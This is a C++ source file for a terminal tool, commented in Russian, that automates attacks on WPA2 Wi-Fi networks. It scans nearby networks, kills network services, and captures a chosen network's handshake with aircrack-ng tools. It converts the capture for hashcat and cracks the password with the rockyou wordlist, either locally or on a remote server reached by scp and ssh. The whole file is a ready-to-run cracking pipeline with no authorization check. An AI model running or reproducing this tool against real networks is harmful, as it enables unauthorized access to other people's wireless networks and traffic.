// Wi-Fi Handshake Capture Tool
// Copyright (C) 2026 arlekin
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>

#include <iostream>
#include <cstdlib>
#include <chrono>
#include <cstdio>
#include <thread>
#include <string>
#include <csignal>
#include <filesystem>
#include <fstream> 
#include <sys/wait.h>
#include <iomanip>  
#include <unistd.h>   
#include <termios.h>
#define Red "\033[0;31m"
#define Green "\033[0;32m"
#define white "\033[0;37m"
#define blue "\033[0;34m"
#define HIGHLIGHT "\033[7m"  // включить инверсию
#define RESET_COLOR "\033[0m" // выключить всё (вернуть как было)
#include <sstream>
#include <vector>

const std::string RESET = "\033[0m";
const std::string YELLOW = "\033[33m";
const std::string MAGENTA = "\033[35m";
const std::string CYAN = "\033[36m";
const std::string BOLD = "\033[1m";
const std::string UNDERLINE = "\033[4m";


struct WiFiNetwork {
    std::string bssid;      // MAC адрес точки доступа
    std::string essid;      // имя сети (SSID)
    std::string channel;    // номер канала
    std::string encryption; // тип шифрования (WPA2, WPA3 и т.д.)
};

//-----------------------------------------------------
//   Настраиваем терминал для работы со стрелками
//-----------------------------------------------------


static struct termios g_orig_termios;//создаём структуру для хранения базовых настроек терминала
void enable_raw_mode(){
    struct termios raw_termios; //создаём структуру для хранения новых настроек терминала
    int result = tcgetattr(STDIN_FILENO, &g_orig_termios); // переходим в режим ядра и создаём переменнуб для хранения кодов возврата
    if (result == -1){ //обработка ошибок если от result
        perror("tcgeatattr error");
        exit(1);
    }
    raw_termios = g_orig_termios; //копируем по байту изначальные настройки что ранее получили из перемнной result
    raw_termios.c_lflag &= ~(ICANON | ECHO); //🥁 я заманаюсь это расписывать, но тут мы короче просто выключаем 2 бита для отключения макросов ICON и Echo
    raw_termios.c_cc[VMIN] = 1; // сколько вернёт read
    raw_termios.c_cc[VTIME] = 0; // сколько будут ждать 0=вечно
    tcsetattr(STDIN_FILENO, TCSANOW, &raw_termios); // применяем все настройки
    
}

void disable_raw_mode(){
    tcsetattr(STDIN_FILENO, TCSANOW, &g_orig_termios); // Восстанавливаем из глобальной переменной
}

//-----------------------------------------------------
//             Управление при помощи стрелочек
//-----------------------------------------------------

int get_keypress(){ //переменная для управления стрелочками
    char ch; // переменная для считавания ровно одного символа.
    char seq[2]; //создаём статический масив
    read(STDIN_FILENO, &ch, 1); //Читаем 1 байт из ввода
    if (ch == '\033'){
        read(STDIN_FILENO, &seq[0], 1); //читаем один байт с ввода клавиатуры ложа в нулевой индекс seq
        read(STDIN_FILENO, &seq[1], 1); //читаем один байт с ввода клавиатуры ложа в первый индекс seq
        if(seq[0]=='['){ // проверяем является ли байт стрелочкой
            if(seq[1]=='A') return 1000; //Ессли первый индекс содержит A поднимаемся вверх
            if(seq[1]=='B') return 1001; //Если второй индекс содержит В опускаемся
            if(seq[1]=='D') return 2000; 
        }
        return 999;
    }
    else if (ch == '\n'){//елси получаем Enter выбираем опцию
    return 2000;
    }
    else{
        return ch; //не стрелка не Enter
    }
}

//-----------------------------------------------------
//               МЕНЮ
//-----------------------------------------------------

void draw_menu(int selected){
    system("clear");
    std::cout<<Green<<"============================================="<<white<<std::endl;
    std::cout<<Red<<"выберите дейстиве"<<white<<std::endl;
// перехват пакета
    if(selected==0){
        std::cout<<HIGHLIGHT<<"> 1 перехват пакета" << RESET << std::endl;
    }
    else{
        std::cout << blue << "1 перехват пакета" << white << std::endl; 
    }
//перекодировка в 22000
    if(selected == 1){
        std::cout << HIGHLIGHT << "> 2 перевести в формат 22000" << RESET << std::endl;
    }
    else {
        std::cout << blue << "2 перевести в формат 22000" << white << std::endl;
    }
//расшифровка
    if(selected == 2){
        std::cout<<HIGHLIGHT<<"> 3 расшифровка" << RESET << std::endl;
    }
    else{
        std::cout << CYAN << "3 расшифровка" << white<<std::endl;
        std::cout << "Нажми Enter или ➔";
    }
    
}

void draw_decrypt_menu(int selected) {
    std::cout << "=============================================" << std::endl;
    std::cout << Red << "выберите действие:" << white << std::endl;
    
    if (selected == 0) {
        std::cout << HIGHLIGHT << "> 1 - расшифровать локально" << RESET << std::endl;
    } else {
        std::cout << blue << "  1 - расшифровать локально" << white << std::endl;
    }
    
    if (selected == 1) {
        std::cout << HIGHLIGHT << "> 2 - отправить на сервер и расшифровать" << RESET << std::endl;
    } else {
        std::cout << blue << "  2 - отправить на сервер и расшифровать" << white << std::endl;
    }
    
    std::cout << "=============================================" << std::endl;
    std::cout << "↑/↓ для навигации, Enter для выбора" << std::endl;
}


void draw_networks_menu(const std::vector<WiFiNetwork>& networks, int selected, int scroll_offset) {
    system("clear");
    
    std::cout << Green << "=============================================" << RESET << std::endl;
    std::cout << Red << "Доступные Wi-Fi сети:" << RESET << std::endl;
    std::cout << Green << "=============================================" << RESET << std::endl;
    
    const int MAX_VISIBLE = 10;
    int start = scroll_offset;
    int end = std::min(start + MAX_VISIBLE, (int)networks.size());
    
    for (int i = start; i < end; i++) {
        if (i == selected) {
            std::cout << HIGHLIGHT << "> " 
                      << networks[i].essid << " | "
                      << "канал " << networks[i].channel << " | "
                      << networks[i].encryption
                      << RESET << std::endl;
        } else {
            std::cout << "  " << networks[i].essid << " | "
                      << "канал " << networks[i].channel << " | "
                      << networks[i].encryption << std::endl;
        }
    }
    
    std::cout << Green << "=============================================" << RESET << std::endl;
    std::cout << CYAN << "↑/↓ - навигация, Enter - выбрать, q - выход" << RESET << std::endl;
}


//-----------------------------------------------------
//               защита от дебила rm -rf
//-----------------------------------------------------



// Экранирование спецсимволов для защиты от инъекций
std::string shellEscape(const std::string& arg) {
    std::string escaped;
    escaped += '\'';
    for (char c : arg) {
        if (c == '\'') {
            escaped += "'\\''";  // экранируем одинарную кавычку
        } else {
            escaped += c;
        }
    }
    escaped += '\'';
    return escaped;
}

//-----------------------------------------------------
// блок функций для отключенеия вывода команд и считывания CSV
//-----------------------------------------------------

class TimedCommandReader {
private:
    int pipe_fd;
    pid_t child_pid;
    
public:
    TimedCommandReader(const std::string& cmd) {
        int pipefd[2];
        pipe(pipefd);
        
        child_pid = fork();
        
        if (child_pid == 0) {
            dup2(pipefd[1], STDOUT_FILENO);
            dup2(pipefd[1], STDERR_FILENO);
            close(pipefd[0]);
            close(pipefd[1]);
            execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
            exit(1);
        }
        
        pipe_fd = pipefd[0];
        close(pipefd[1]);
    }
    
    void stopAndRead() {
        kill(child_pid, SIGTERM);
        usleep(100000);
        
        if (kill(child_pid, 0) == 0) {
            kill(child_pid, SIGKILL);
        }
        
        char buffer[4096];
        while (read(pipe_fd, buffer, sizeof(buffer)) > 0) {}
        
        close(pipe_fd);
        waitpid(child_pid, nullptr, WNOHANG);
    }
    
    ~TimedCommandReader() {
        if (child_pid > 0) {
            kill(child_pid, SIGKILL);
            close(pipe_fd);
            waitpid(child_pid, nullptr, WNOHANG);
        }
    }
};

std::vector<std::string> splitCSV(const std::string& line) {
    std::vector<std::string> columns;
    std::stringstream ss(line);
    std::string cell;
    
    while (std::getline(ss, cell, ',')) {
        if (cell.size() >= 2 && cell.front() == '"' && cell.back() == '"') {
            cell = cell.substr(1, cell.size() - 2);
        }
        columns.push_back(cell);
    }
    return columns;
}

std::vector<std::vector<std::string>> readCSV(const std::string& filename) {
    std::vector<std::vector<std::string>> data;
    std::ifstream file(filename);
    
    if (!file.is_open()) {
        return data;
    }
    
    std::string line;
    bool is_first_line = true;
    
    while (std::getline(file, line)) {
        if (line.empty()) continue;
        
        if (is_first_line) {
            is_first_line = false;
            continue;
        }
        
        std::vector<std::string> columns = splitCSV(line);
        if (columns.size() >= 14) {
            data.push_back(columns);
        }
    }
    
    return data;
}



std::string resolvePathStrict(const std::string& path) {
    if (path.empty()) return "";
    
    std::string result = path;
    
    if (result[0] == '~') {
        const char* home = std::getenv("HOME");
        if (home) result = std::string(home) + result.substr(1);
    }
    
    try {
        return std::filesystem::canonical(result).string();
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Ошибка пути: " << e.what() << std::endl;
        return result;
    }
}

//-----------------------------------------------------
//               красивый бар загрузки
//-----------------------------------------------------

void printBar(int seconds) {
    const int BAR_WIDTH = 32;
    if (seconds <= 0) {
        std::cout << "[===] 100%" << std::endl;
        return;
    }
    auto start = std::chrono::steady_clock::now();
    int total_steps = 100;
    
    for (int i = 0; i <= total_steps; i++) {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start
        ).count();
        
        if (elapsed >= seconds * 1000) {
            
            std::cout << "\r[" << std::string(BAR_WIDTH - 2, '=') << "] 100%" << std::flush;
            break;
        }
        
        int progress = (elapsed * 100) / (seconds * 1000);
        int fill = (BAR_WIDTH - 2) * progress / 100;
        
        std::string bar = "[";
        bar += std::string(fill, '=');
        if (progress < 100) bar += '>';
        bar += std::string(BAR_WIDTH - 2 - fill - (progress < 100 ? 1 : 0), ' ');
        bar += "]";
        
        std::cout << "\r" << bar << " " << progress << "%" << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    std::cout << std::endl;
}



std::string getFreeFilename(const std::string& base_name) {
    for (int i = 1; i <= 100; i++) {
        std::stringstream ss;
        ss << base_name << "-" << std::setw(2) << std::setfill('0') << i << ".csv";
        
        if (!std::filesystem::exists(ss.str())) {
            std::stringstream result;
            result << base_name << "-" << std::setw(2) << std::setfill('0') << i;
            return result.str(); 
        }
    }
    return base_name + "-" + std::to_string(time(nullptr));
}

//-----------------------------------------------------
//               проверка вайфай сети
//-----------------------------------------------------



std::string find_wifi_interface() {
    // Функция ищет любой интерфейс с "wl" в названии (wlan0, wlp0s20f3 и т.д.)
    FILE* pipe = popen("ip link show | grep -oE 'wl[a-zA-Z0-9]+' | head -1", "r");
    if (!pipe) {
        std::cerr << Red << "Не удалось выполнить команду поиска интерфейса" << RESET << std::endl;
        return "";
    }
    
    char buffer[128];
    std::string interface;
    if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        // fgets читает строку из pipe в buffer
        interface = buffer;
        // удаляем символ новой строки
        if (!interface.empty() && interface.back() == '\n') {
            interface.pop_back();
        }
    }
    
    pclose(pipe);  // закрываем pipe
    
    if (interface.empty()) {
        std::cerr << Red << "Wi-Fi интерфейс не найден!" << RESET << std::endl;
        std::cerr << "Проверьте: подключен ли Wi-Fi адаптер?" << std::endl;
        return "";
    }
    
    return interface;
}
void signalHandler(int signum) {
    std::cout << "\n\n[!] Останавливаем мониторинг..." << std::endl;
    std::string interface = find_wifi_interface();
    if (!interface.empty()) {
        std::system(("sudo airmon-ng stop " + interface + "mon 2>/dev/null").c_str());
    }
    std::system("sudo systemctl restart NetworkManager");
    std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
    
    // Очищаем состояние cin
    std::cin.clear();
    // Игнорируем оставшиеся символы
    std::cin.ignore(10000, '\n');
    
    exit(0);
}

//-----------------------------------------------------
//      сканирование сетей и возврат списка
//-----------------------------------------------------

std::vector<WiFiNetwork> check_wifi(const std::string& interface) {
  
    std::vector<WiFiNetwork> networks;  // пустой список сетей
    
    // Генерируем уникальное имя для временного файла
    std::string file_prefix = getFreeFilename("scan_result");
    // getFreeFilename создаёт имя типа "scan_result_001", "scan_result_002" и т.д.
    
    // Останавливаем monitor режим если был активен
    std::string stop_cmd = "sudo airmon-ng stop " + interface + "mon 2>/dev/null";
    std::system(stop_cmd.c_str());  // 2>/dev/null - скрываем ошибки
    
    // Убиваем мешающие процессы (NetworkManager, dhclient и т.д.)
    std::system("sudo airmon-ng check kill");
    
    // Включаем monitor режим на интерфейсе
    std::string start_cmd = "sudo airmon-ng start " + interface;
    std::system(start_cmd.c_str());
    
    // Даём время на создание monitor интерфейса
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    std::string mon_interface = interface + "mon";  // например "wlp0s20f3mon"
    
    // Формируем команду для airodump-ng
    std::string command = "sudo airodump-ng " + mon_interface + 
                         " --write " + file_prefix + 
                         " --output-format csv --write-interval 1";
    
    TimedCommandReader reader(command);
    std::cout << CYAN << "Сканирование сетей... (30 секунд)" << RESET << std::endl;
    printBar(30);  
    reader.stopAndRead();  // ждём 30 секунд и останавливаем
    
    // Даём время на запись последних данных в файл
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    // Формируем путь к CSV файлу
    std::string csv_path = file_prefix + "-01.csv";
    // airodump-ng добавляет "-01" к имени файла
    
    auto csv_data = readCSV(csv_path);  
    
    // Парсим CSV данные
    for (const auto& row : csv_data) {
        // row - это vector<string>, одна строка из CSV
        
        // Проверяем: строка содержит ESSID (13 колонка) и BSSID (0 колонка)
        if (row.size() > 13 && !row[13].empty() && row[0].size() == 17) {
            // row[0].size() == 17 - проверка что BSSID имеет формат XX:XX:XX:XX:XX:XX
            
            WiFiNetwork net;  // создаём структуру для сети
            net.bssid = row[0];        // BSSID всегда в первой колонке
            net.channel = row[3];      // канал в четвёртой колонке
            net.essid = row[13];       // имя сети в 14-й колонке
            
            // Шифрование в 6-й колонке (индекс 5), если есть
            if (row.size() > 5) {
                net.encryption = row[5];
            } else {
                net.encryption = "Unknown";
            }
            
            networks.push_back(net);   // добавляем в список
        }
    }
    
    return networks;  // возвращаем список всех найденных сетей
}



//-----------------------------------------------------
//             первая опция (перехват handshake)
//-----------------------------------------------------



void capture_wpa_handshake() {

    std::string wifi_interface = find_wifi_interface();
    // Вызываем функцию поиска интерфейса
    
    if (wifi_interface.empty()) {
        // Если интерфейс не найден
        std::cerr << Red << "Wi-Fi интерфейс не найден!" << RESET << std::endl;
        std::cerr << "Убедитесь, что Wi-Fi адаптер подключен и включен" << std::endl;
        return;
    }
    
    std::cout << Green << "Найден Wi-Fi интерфейс: " << wifi_interface << RESET << std::endl;
    enable_raw_mode();
    std::cout << "Начинаю сканирование сетей..." << std::endl;
    

    std::vector<WiFiNetwork> networks = check_wifi(wifi_interface);
    // scan_networks вернёт список всех обнаруженных сетей
    
    if (networks.empty()) {
        // Если сетей нет
        std::cerr << Red << "Сети не найдены!" << RESET << std::endl;
        std::cerr << "Проверьте: включён ли Wi-Fi, есть ли доступные сети" << std::endl;
        return;
    }
    
    int selected = 0;           // индекс выбранной сети
    int scroll_offset = 0;      // сколько сетей пропущено
    int running = 1;            // флаг работы меню
    
    // Первая отрисовка
    draw_networks_menu(networks, selected, scroll_offset);
    
    while (running) {
        int key = get_keypress();  // читаем нажатие клавиши
        
        switch (key) {
            case 1000:  // стрелка вверх
                if (selected > 0) {
                    selected--;
                    // Корректируем прокрутку если вышли за верх
                    if (selected < scroll_offset) {
                        scroll_offset = selected;
                    }
                    draw_networks_menu(networks, selected, scroll_offset);
                }
                break;
                
            case 1001:  // стрелка вниз
                if (selected < (int)networks.size() - 1) {
                    selected++;
                    // Корректируем прокрутку если вышли за низ
                    if (selected >= scroll_offset + 10) {
                        scroll_offset = selected - 9;
                    }
                    draw_networks_menu(networks, selected, scroll_offset);
                }
                break;
                
            case 2000:  // Enter - выбираем сеть
                running = 0;
                break;
                
            case 'q':   // выход
            case 'Q':
                std::cout << "Сканирование отменено" << std::endl;
                return;
        }
    }
    
    std::string target_name = networks[selected].essid;
    std::string BSSID = networks[selected].bssid;
    std::string Number_chanel = networks[selected].channel;
    
    std::cout << "\n" << Green << "Выбрана сеть: " << target_name << RESET << std::endl;
    std::cout << "BSSID: " << BSSID << std::endl;
    std::cout << "Канал: " << Number_chanel << std::endl;
    

    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    
    // Создаём папку если её нет
    std::system(("mkdir -p " + handshake_dir).c_str());
    // mkdir -p - создаёт папку и все промежуточные директории
    
    // Останавливаем monitor режим если был активен (освобождаем интерфейс)
    std::system(("sudo airmon-ng stop " + wifi_interface + "mon 2>/dev/null").c_str());
    
    // Заново включаем monitor режим на нужном канале
    std::system(("sudo airmon-ng start " + wifi_interface + " " + Number_chanel).c_str());
    // Здесь мы сразу указываем канал, чтобы airodump работал на правильной частоте
    
    std::string mon_interface = wifi_interface + "mon";
    
    // Даём время на активацию
    std::this_thread::sleep_for(std::chrono::seconds(2));
    

    std::cout << "\n=============================================" << std::endl;
    std::cout << "Начинаем перехват handshake для сети: " << target_name << std::endl;
    std::cout << "BSSID: " << BSSID << " | Канал: " << Number_chanel << std::endl;
    std::cout << "Файлы будут сохранены в: " << handshake_dir << "/" << target_name << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "\n[!] Нажмите Ctrl+C, когда handshake будет пойман" << std::endl;
    std::cout << "[!] Или подождите, пока клиент подключится к сети\n" << std::endl;
    
    // Формируем команду для захвата
    std::string command = "sudo airodump-ng -c " + Number_chanel + 
                          " --bssid " + shellEscape(BSSID) + 
                          " -w " + shellEscape(handshake_dir + "/" + target_name) + 
                          " " + mon_interface;
    
    std::cout << CYAN << "Ждём handshake..." << RESET << std::endl;
    printBar(15);  // небольшая пауза перед захватом
    
    std::system(command.c_str());  // Запускаем захват (будет работать пока не нажмут Ctrl+C)
}


//-----------------------------------------------------
//              =вторая опция
//-----------------------------------------------------

void convert_to_22000() {
    std::system("sudo airmon-ng stop wlp0s20f3mon");
    std::system("sudo systemctl restart NetworkManager");
    
    // Константный путь к папке с хэшами
    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    
    std::cout << "\n=============================================" << std::endl;
    std::cout << Green << "Конвертация .cap файла в формат 22000" << white << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "Файлы для конвертации находятся в: " << handshake_dir << std::endl;
    
    std::printf("Пожалуйста введите название файла (без расширения): ");
    std::string name_for_file_cap = "";
    std::cin >> name_for_file_cap;
    std::cout << std::endl;
    
    // Полный путь к .cap файлу
    std::string cap_path = handshake_dir + "/" + name_for_file_cap + ".cap";
    std::string output_path = handshake_dir + "/" + name_for_file_cap + ".22000";
    
    std::string command = "hcxpcapngtool -o " + shellEscape(output_path) + " " + shellEscape(cap_path);
    
    std::cout << CYAN << "Конвертируем файл: " << cap_path << RESET << std::endl;
    int hash = std::system(command.c_str());
    
    if (hash == 0) {
        std::cout << Green << "Победа! Файл преобразован и сохранён в: " << output_path << white << std::endl;
        std::cout << "Файл готов к отправке на сервер или локальному взлому" << std::endl;
    } else {
        std::cout << Red << "Ошибка при конвертации. Проверьте путь к файлу." << white << std::endl;
    }
}

// Проверка имени файла (только буквы, цифры, точки, дефисы, подчёркивания)
bool isSafeFilename(const std::string& filename) {
    if (filename.empty()) return false;
    for (char c : filename) {
        if (!isalnum(c) && c != '.' && c != '-' && c != '_') {
            return false;
        }
    }
    return true;
}

//-----------------------------------------------------
//               третья опция
//-----------------------------------------------------
void decrypt_wpa() {
    // Путь к папке с хэшами
    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    
    int local_or_server = 0;  // 0 = локально, 1 = сервер
    int running = 1;

    draw_decrypt_menu(local_or_server);

    while (running) {
        int key = get_keypress();
        
        switch (key) {
            case 1000:  // стрелка вверх
                if (local_or_server > 0) {
                    local_or_server--;
                    draw_decrypt_menu(local_or_server);
                }
                break;
                
            case 1001:  // стрелка вниз
                if (local_or_server < 1) {
                    local_or_server++;
                    draw_decrypt_menu(local_or_server);
                }
                break;
                
            case 2000:  // Enter
                running = 0;
                break;
        }
    }
        disable_raw_mode();  // ← ДОБАВИТЬ ЭТУ СТРОКУ!
    std::cout << "пожалуйста введите имя файла (без расширения): ";
    std::string file_name = "";
    std::cin >> file_name;
    
    // Проверка безопасности имени файла
    if (!isSafeFilename(file_name)) {
        std::cerr << Red << "Ошибка: имя файла содержит недопустимые символы" << RESET << std::endl;
        return;
    }
    
    // Полный путь к .22000 файлу
    std::string full_filename = handshake_dir + "/" + file_name + ".22000";
    
    // ==================== ЛОКАЛЬНАЯ РАСШИФРОВКА ====================
    if (local_or_server == 0) {
        std::cout << Green << "локальная расшифровка" << white << std::endl;
        
        // Проверяем существование файла
        std::ifstream hash_file(full_filename);
        if (!hash_file.good()) {
            std::cerr << Red << "Ошибка: файл " << full_filename << " не найден!" << RESET << std::endl;
            return;
        }
        hash_file.close();
        
        // Запрашиваем путь к словарю
        std::string dict_path_raw = "";
        std::cout << "путь к словарю rockyou2024.zip: ";
        std::cin >> dict_path_raw;
        
        std::string dict_path = resolvePathStrict(dict_path_raw);
        
        // Проверяем существование словаря
        std::ifstream file_check(dict_path);
        if (!file_check.good()) {
            std::cerr << Red << "Ошибка: словарь не найден" << RESET << std::endl;
            return;
        }
        file_check.close();
        
        // Безопасный запуск hashcat (команда экранирована)
        std::string local_cmd = "unzip -p " + shellEscape(dict_path) + 
                               " | hashcat -m 22000 -a 0 " + shellEscape(full_filename) + 
                               " -O -w 3";
        std::cout << CYAN << "Выполняется команда..." << RESET << std::endl;
        
        int result = std::system(local_cmd.c_str());
        if (result != 0) {
            std::cerr << Red << "Ошибка при выполнении hashcat" << RESET << std::endl;
        }
    }
    
    // ==================== РАСШИФРОВКА ЧЕРЕЗ SSH ====================
    else if (local_or_server == 1) {
        std::cout << Green << "отправка на сервер и расшифровка" << white << std::endl;
        
        // Проверяем существование файла
        std::ifstream hash_file(full_filename);
        if (!hash_file.good()) {
            std::cerr << Red << "Ошибка: файл " << full_filename << " не найден!" << RESET << std::endl;
            return;
        }
        hash_file.close();
        
        // Ввод данных для SSH подключения
        std::string name_plus_ip_ssh, port, put_na_servac, server_dict_path;
        
        std::cout << "имя и айпи от ssh (имя@айпи): ";
        std::cin >> name_plus_ip_ssh;
        
        // Проверка формата
        if (name_plus_ip_ssh.find('@') == std::string::npos) {
            std::cerr << Red << "Ошибка: неверный формат" << RESET << std::endl;
            return;
        }
        
        std::cout << "port (обычно 22): ";
        std::cin >> port;
        
        // Проверка что порт - число
        for (char c : port) {
            if (!isdigit(c)) {
                std::cerr << Red << "Ошибка: порт должен быть числом" << RESET << std::endl;
                return;
            }
        }
        
        std::cout << "путь на сервере для сохранения: ";
        std::cin >> put_na_servac;
        
        std::cout << "путь к словарю на сервере: ";
        std::cin >> server_dict_path;
        
        // Копируем файл на сервер через scp
        std::string scp_cmd = "scp -P " + port + " " + shellEscape(full_filename) + 
                             " " + shellEscape(name_plus_ip_ssh + ":" + put_na_servac + "/" + file_name + ".22000");
        std::cout << CYAN << "Копируем файл на сервер..." << RESET << std::endl;
        
        if (std::system(scp_cmd.c_str()) != 0) {
            std::cerr << Red << "Ошибка при копировании" << RESET << std::endl;
            return;
        }
        
        // Формируем команду для выполнения на сервере
        std::string remote_cmd = "cd " + shellEscape(put_na_servac) + 
                                " && unzip -p " + shellEscape(server_dict_path) + 
                                " | hashcat -m 22000 -a 0 " + shellEscape(file_name + ".22000") + 
                                        " -O -w 3 -d 1";
                
        // Запускаем расшифровку на сервере
        std::string ssh_cmd = "ssh -p " + port + " " + shellEscape(name_plus_ip_ssh) + 
                             " " + shellEscape(remote_cmd);
        std::cout << CYAN << "Запускаем расшифровку на сервере..." << RESET << std::endl;
        
        if (std::system(ssh_cmd.c_str()) != 0) {
            std::cerr << Red << "Ошибка при выполнении" << RESET << std::endl;
        }
    }
    else {
        std::cout << Red << "неверный выбор" << white << std::endl;
    }
}

int main() {
    // Обработчик Ctrl+C
    std::signal(SIGINT, [](int) { 
        disable_raw_mode(); 
        std::cout << "\nВыход..." << std::endl; 
        exit(0); 
    });

    enable_raw_mode();  // включаем raw режим ОДИН РАЗ

    int selected = 0;
    int running = 1;

    draw_menu(selected);

    while (running) {
        int key = get_keypress();  // ждём нажатие клавиши
        
        switch (key) {
            case 1000:  // стрелка ВВЕРХ
                if (selected > 0) {
                    selected--;
                    draw_menu(selected);
                }
                break;
                
            case 1001:  // стрелка ВНИЗ
                if (selected < 2) {
                    selected++;
                    draw_menu(selected);
                }
                break;
                
            case 2000:  // ENTER или стрелка влево
                running = 0;  // выходим из цикла
                break;
                
            case 'q':   // клавиша q
            case 'Q':   // заглавная Q
                disable_raw_mode();
                std::cout << "До свидания!" << std::endl;
                return 0;
                
            default:
                // Остальные клавиши игнорируем
                break;
        }
    }  // ← цикл ЗАКРЫВАЕТСЯ ЗДЕСЬ!

    // ============================================
    // ВСЁ, ЧТО НИЖЕ, ВЫПОЛНЯЕТСЯ ПОСЛЕ ВЫХОДА ИЗ ЦИКЛА
    // ============================================
    
    disable_raw_mode();  // восстанавливаем терминал (ОДИН РАЗ после цикла)
    system("clear");

    switch (selected) {
        case 0:
            std::cout << "Запуск перехвата пакетов..." << std::endl;
            capture_wpa_handshake();
            break;
        case 1:
            std::cout << "Конвертация в формат 22000..." << std::endl;
            convert_to_22000();
            break;
        case 2:
            std::cout << "Запуск подбора..." << std::endl;
            decrypt_wpa();
            break;
    }

    return 0;
}